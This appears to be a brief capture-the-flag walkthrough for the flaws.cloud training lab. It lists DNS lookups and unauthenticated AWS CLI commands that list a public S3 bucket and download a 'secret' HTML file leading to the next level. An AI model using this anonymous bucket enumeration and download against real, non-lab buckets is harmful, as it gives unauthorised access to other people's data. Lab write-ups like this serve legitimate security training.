Hacking Into a public S3 bucket

```
nslookup flaws.cloud
```

```
nslookup  52.92.196.35
```

```
aws s3 ls s3://flaws.cloud  --no-sign-request
aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2

```

```
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html --no-sign-request secret.html
```

```
cat secret.html

open secret.html
```

;; Find the link to next level